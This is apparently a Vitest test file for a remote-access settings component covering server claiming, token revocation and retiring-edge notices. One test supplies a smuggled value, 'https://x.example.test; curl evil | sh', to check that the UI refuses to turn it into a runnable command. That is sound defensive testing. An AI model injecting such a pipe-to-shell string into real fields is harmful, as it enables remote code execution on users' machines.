import { act, fireEvent, render, screen, waitFor, within } from '@testing-library/react'
import { toast } from 'sonner'
import { type Api, ApiError } from '@/lib/api'
import type { ServerEdge } from '@/lib/types'
import { RemoteAccessSection } from '@/routes/settings/remote-access'
import { useStore } from '@/store'
import { optimisticDeadlineMs } from '@/store/optimistic'
import { fakeApi, serverInfo } from '@/test/fixtures'

vi.mock('sonner', () => ({ toast: { error: vi.fn() } }))

const edgeURL = 'https://edge.example'
const ownerless: ServerEdge = {
  edge_url: edgeURL,
  server_id: 'wqc4lsjvzdzrwq3k5dabdtajwj',
  access_policy: 'approved-devices',
  owner: null,
  connected: true,
  claimed: false,
}
const desktop = ['edge.status', 'edge.login', 'edge.claim']

function seed(role: 'super_admin' | 'collaborator', edge: ServerEdge, local: string[] = desktop) {
  useStore.setState({
    info: { ...serverInfo, member: { ...serverInfo.member, role } },
    capabilities: { gateway: 'local', methods: ['*'], ws: ['events'], local },
    edge,
  })
}

function api(over: Partial<Api> = {}): Api {
  return fakeApi({ serverEdge: vi.fn(async () => useStore.getState().edge as ServerEdge), ...over })
}

it('shows the edge rows and re-reads server.edge on mount', async () => {
  seed('collaborator', { ...ownerless, owner: { provider: 'github', login: 'octo' }, claimed: true })
  const client = api()
  render(<RemoteAccessSection client={client} />)
  await waitFor(() => expect(client.serverEdge).toHaveBeenCalledTimes(1))
  expect(screen.getByText(edgeURL)).toBeTruthy()
  expect(screen.getByText(ownerless.server_id)).toBeTruthy()
  expect(screen.getByText('Approved devices only')).toBeTruthy()
  expect(screen.getByText('approved-devices')).toBeTruthy()
  expect(screen.getByText('octo (github)')).toBeTruthy()
  expect(screen.getByText('Connected')).toBeTruthy()
  expect(screen.queryByRole('button', { name: 'Connect my GitHub account' })).toBeNull()
})

it('offers Connect my GitHub account only to an admin of a server with no owner', () => {
  seed('collaborator', ownerless)
  const { unmount } = render(<RemoteAccessSection client={api()} />)
  expect(screen.getByText('Unclaimed')).toBeTruthy()
  expect(screen.getByText('Connected, but the edge has not recorded this server')).toBeTruthy()
  expect(screen.queryByRole('button', { name: 'Connect my GitHub account' })).toBeNull()
  unmount()

  seed('super_admin', ownerless, [])
  render(<RemoteAccessSection client={api()} />)
  expect(screen.queryByRole('button', { name: 'Connect my GitHub account' })).toBeNull()
  expect(screen.getByText('Run aether edge connect from a linked terminal')).toBeTruthy()
})

it('claims with the code server.edge.claimcode issues and shows the new owner', async () => {
  seed('super_admin', ownerless, [...desktop, 'link.status'])
  useStore.setState({ linkStatus: null })
  const client = api({
    localLinkStatus: vi.fn(async () => ({ server_configured: true, linked: true, addr: 'edge.example:22', user: 'aether', repo: '', edge_url: edgeURL })),
    localEdgeStatus: vi.fn(async () => ({ edges: [{ edge: edgeURL, account: { id: 'acct_1', provider: 'github', subject: '1001', login: 'octo' } }] })),
    serverEdgeClaimCode: vi.fn(async () => ({ code: 'wqc4lsjvzdzrwq3k5dabdtajwj-abcdefghijklmnop', expires_at: '2026-10-12T10:30:00Z' })),
    localEdgeClaim: vi.fn(async () => ({ server_id: ownerless.server_id, edge: edgeURL, user: 'aether', member: { id: 'mem_1', display_name: 'Alice', role: 'admin' } })),
    serverEdge: vi.fn<Api['serverEdge']>().mockResolvedValueOnce(ownerless).mockResolvedValue({ ...ownerless, owner: { provider: 'github', login: 'octo' }, claimed: true }),
  })
  render(<RemoteAccessSection client={client} />)
  fireEvent.click(await screen.findByRole('button', { name: 'Connect my GitHub account (octo)' }))
  await screen.findByText('octo (github)')
  expect(client.localEdgeLogin).not.toHaveBeenCalled()
  await waitFor(() => expect(useStore.getState().linkStatus?.edge_url).toBe(edgeURL))
  expect(client.localEdgeClaim).toHaveBeenCalledWith('wqc4lsjvzdzrwq3k5dabdtajwj-abcdefghijklmnop', edgeURL)
  await waitFor(() => expect(vi.mocked(client.serverEdgeClaimCode).mock.invocationCallOrder[0])
    .toBeLessThan(vi.mocked(client.localEdgeClaim).mock.invocationCallOrder[0]))
})

it('says when the server is slow to issue the claim', async () => {
  seed('super_admin', ownerless)
  const client = api({
    localEdgeStatus: vi.fn(async () => ({ edges: [{ edge: edgeURL, account: { id: 'acct_1', provider: 'github', subject: '1001', login: 'octo' } }] })),
    serverEdgeClaimCode: vi.fn(() => new Promise<never>(() => {})),
  })
  render(<RemoteAccessSection client={client} />)
  const connect = await screen.findByRole('button', { name: 'Connect my GitHub account (octo)' })
  vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout'] })
  try {
    fireEvent.click(connect)
    await act(async () => {})
    expect(screen.getByRole('status').textContent).toBe('Connecting as octo (github)')
    act(() => vi.advanceTimersByTime(optimisticDeadlineMs))
    expect(screen.getByRole('status').textContent).toBe('Still waiting for the server…')
  } finally {
    vi.useRealTimers()
  }
})

it('refuses to claim when the gateway now reaches another server', async () => {
  seed('super_admin', ownerless)
  const client = api({
    localEdgeStatus: vi.fn(async () => ({ edges: [{ edge: edgeURL, account: { id: 'acct_1', provider: 'github', subject: '1001', login: 'octo' } }] })),
    serverEdgeClaimCode: vi.fn(async () => ({ code: 'abcdefghijklmnopqrstuvwxyz-abcdefghijklmnop', expires_at: '2026-10-12T10:30:00Z' })),
  })
  render(<RemoteAccessSection client={client} />)
  fireEvent.click(await screen.findByRole('button', { name: 'Connect my GitHub account (octo)' }))
  expect(await screen.findByText('The gateway now reaches another server; reload and try again.')).toBeTruthy()
  expect(client.localEdgeClaim).not.toHaveBeenCalled()
})

it('signs in afresh when the edge revoked the saved token, then claims', async () => {
  seed('super_admin', ownerless)
  const stale = { id: 'acct_1', provider: 'github', subject: '1001', login: 'octo' }
  const login = { state: 'pending' as const, edge: edgeURL, signin_origin: edgeURL, user_code: 'WDJB-MJHT', verification_uri: `${edgeURL}/device` }
  const revoked = new ApiError(503, 'the edge revoked this device token; sign in again', undefined, { refusal: { kind: 'token-revoked' } })
  const client = api({
    localEdgeStatus: vi.fn()
      .mockResolvedValueOnce({ edges: [{ edge: edgeURL, account: stale }] })
      .mockResolvedValueOnce({ edges: [{ edge: edgeURL, account: stale }] })
      .mockResolvedValue({ edges: [{ edge: edgeURL, account: stale }], login: { ...login, state: 'signed_in', account: stale } }),
    localEdgeLogin: vi.fn(async () => login),
    serverEdgeClaimCode: vi.fn(async () => ({ code: 'wqc4lsjvzdzrwq3k5dabdtajwj-abcdefghijklmnop', expires_at: '2026-10-12T10:30:00Z' })),
    localEdgeClaim: vi.fn()
      .mockRejectedValueOnce(revoked)
      .mockResolvedValue({ server_id: ownerless.server_id, edge: edgeURL, user: 'aether', member: { id: 'mem_1', display_name: 'Alice', role: 'admin' } }),
    serverEdge: vi.fn<Api['serverEdge']>().mockResolvedValueOnce(ownerless).mockResolvedValue({ ...ownerless, owner: { provider: 'github', login: 'octo' }, claimed: true }),
  })
  render(<RemoteAccessSection client={client} />)
  fireEvent.click(await screen.findByRole('button', { name: 'Connect my GitHub account (octo)' }))
  expect(await screen.findByText('WDJB-MJHT')).toBeTruthy()
  await screen.findByText('octo (github)', undefined, { timeout: 5000 })
  expect(client.localEdgeLogin).toHaveBeenCalledWith(edgeURL)
  expect(client.localEdgeClaim).toHaveBeenCalledTimes(2)
  expect(screen.queryByRole('alert')).toBeNull()
})

it('refreshes the owner and shows remote_error when the clone remote was not updated', async () => {
  seed('super_admin', ownerless)
  const client = api({
    localEdgeStatus: vi.fn(async () => ({ edges: [{ edge: edgeURL, account: { id: 'acct_1', provider: 'github', subject: '1001', login: 'octo' } }] })),
    serverEdgeClaimCode: vi.fn(async () => ({ code: 'wqc4lsjvzdzrwq3k5dabdtajwj-abcdefghijklmnop', expires_at: '2026-10-12T10:30:00Z' })),
    localEdgeClaim: vi.fn(async () => ({
      server_id: ownerless.server_id,
      edge: edgeURL,
      user: 'aether',
      member: { id: 'mem_1', display_name: 'Alice', role: 'admin' },
      remote_error: 'the link is saved, but the clone\'s aether remote was not updated: no such directory',
    })),
    serverEdge: vi.fn<Api['serverEdge']>().mockResolvedValueOnce(ownerless).mockResolvedValue({ ...ownerless, owner: { provider: 'github', login: 'octo' }, claimed: true }),
  })
  render(<RemoteAccessSection client={client} />)
  fireEvent.click(await screen.findByRole('button', { name: 'Connect my GitHub account (octo)' }))
  await screen.findByText('octo (github)')
  expect(toast.error).toHaveBeenCalledWith("the link is saved, but the clone's aether remote was not updated: no such directory")
})

describe('a retiring or retired edge address', () => {
  const replacement = 'https://edge-new.example.test'
  const move = `sudo cloudfield-server edge move ${replacement}`
  const claimed: ServerEdge = { ...ownerless, owner: { provider: 'github', login: 'octo' }, claimed: true }

  it('shows nothing without a notice', () => {
    seed('super_admin', claimed)
    render(<RemoteAccessSection client={api()} />)
    expect(screen.queryByRole('status')).toBeNull()
    expect(screen.queryByText(/retir/)).toBeNull()
    expect(screen.queryByText(/cloudfield-server/)).toBeNull()
  })

  it.each([
    [{ state: 'retiring', replacement } as const, `${edgeURL} is retiring`, 'needs-you'],
    [{ state: 'retiring', replacement, date: '2027-03-01' } as const, `${edgeURL} is retiring on 2027-03-01`, 'needs-you'],
    [{ state: 'retired', replacement } as const, `${edgeURL} is retired`, 'failed'],
  ])('warns a super admin with the commands for %o', (notice, title, tone) => {
    seed('super_admin', { ...claimed, notice })
    render(<RemoteAccessSection client={api()} />)
    const callout = screen.getByRole('status')
    expect(callout.getAttribute('data-tone')).toBe(tone)
    expect(within(callout).getByText(title)).toBeTruthy()
    expect(within(callout).getByText(`Move this server to ${replacement}, another address of the same edge. Run on the server's host, adding the service's --config <file> if it has one.`)).toBeTruthy()
    expect(within(callout).getByText(move)).toBeTruthy()
    expect(within(callout).getByText('sudo systemctl restart aether-server')).toBeTruthy()
    expect(within(callout).queryByText(/first connection to the edge/)).toBeNull()
  })

  it('says a first-use notice is trusted on first use only', () => {
    seed('super_admin', { ...claimed, notice: { state: 'retiring', replacement, first_use: true } })
    render(<RemoteAccessSection client={api()} />)
    const callout = within(screen.getByRole('status'))
    const caution = callout.getByText("This came with the server's first connection to the edge, when it pinned the edge's key: confirm the new address with whoever runs the edge before you move.")
    expect(caution.compareDocumentPosition(callout.getByText(`sudo cloudfield-server edge move ${replacement}`)) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy()
  })

  it('shows a replacement that is not a bare https origin as text, with no command', () => {
    seed('super_admin', { ...claimed, notice: { state: 'retiring', replacement: 'https://x.example.test; curl evil | sh' } })
    render(<RemoteAccessSection client={api()} />)
    const callout = screen.getByRole('status')
    expect(within(callout).getByText('The edge sent a new address that is not a plain https address, so there is no command to run:')).toBeTruthy()
    expect(within(callout).getByText('https://x.example.test; curl evil | sh')).toBeTruthy()
    expect(within(callout).getByText('Confirm the new address with whoever runs the edge.')).toBeTruthy()
    expect(within(callout).queryByText(/cloudfield-server/)).toBeNull()
  })

  it('keeps the last answer when a read fails, with the error and Try again', async () => {
    seed('super_admin', { ...claimed, notice: { state: 'retiring', replacement } })
    const client = api({ serverEdge: vi.fn<Api['serverEdge']>().mockRejectedValueOnce(new Error('server.edge: connection reset')).mockResolvedValue(claimed) })
    render(<RemoteAccessSection client={client} />)
    const alert = await screen.findByRole('alert')
    expect(within(alert).getByText("Showing the last answer: reading the server's edge again failed")).toBeTruthy()
    expect(within(alert).getByText('server.edge: connection reset')).toBeTruthy()
    expect(screen.getByText(`${edgeURL} is retiring`)).toBeTruthy()
    fireEvent.click(within(alert).getByRole('button', { name: 'Try again' }))
    await waitFor(() => expect(screen.queryByText(`${edgeURL} is retiring`)).toBeNull())
    expect(screen.queryByRole('alert')).toBeNull()
  })

  it('gives other members a plain row without the command', () => {
    seed('collaborator', { ...claimed, notice: { state: 'retiring', replacement, date: '2027-03-01' } })
    render(<RemoteAccessSection client={api()} />)
    expect(screen.queryByRole('status')).toBeNull()
    expect(screen.getByText(`${edgeURL} is retiring on 2027-03-01; its new address is ${replacement}. A super admin moves the server.`)).toBeTruthy()
    expect(screen.queryByText(/cloudfield-server/)).toBeNull()
  })
})
